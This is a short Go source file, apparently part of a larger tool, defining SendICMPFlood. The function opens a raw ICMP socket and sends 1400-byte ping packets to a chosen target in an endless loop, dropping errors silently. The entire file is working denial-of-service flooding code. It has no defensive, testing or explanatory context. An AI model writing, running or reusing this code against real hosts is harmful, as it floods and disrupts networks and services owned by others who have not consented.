package flood

import (
	"context"
	"net"
	"os"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func SendICMPFlood(ctx context.Context, target string, sleepTime time.Duration) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return // fail silently if needed
	}
	defer conn.Close()

	dst, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		return
	}

	id := os.Getpid() & 0xffff
	seq := 0

	for {
		select {
		case <-ctx.Done():
			return
		default:
			seq++
			msg := icmp.Message{
				Type: ipv4.ICMPTypeEcho,
				Code: 0,
				Body: &icmp.Echo{
					ID:   id,
					Seq:  seq,
					Data: make([]byte, 1400),
				},
			}
			b, err := msg.Marshal(nil)
			if err == nil {
				_, _ = conn.WriteTo(b, dst)
			}
			time.Sleep(sleepTime)
		}
	}
}
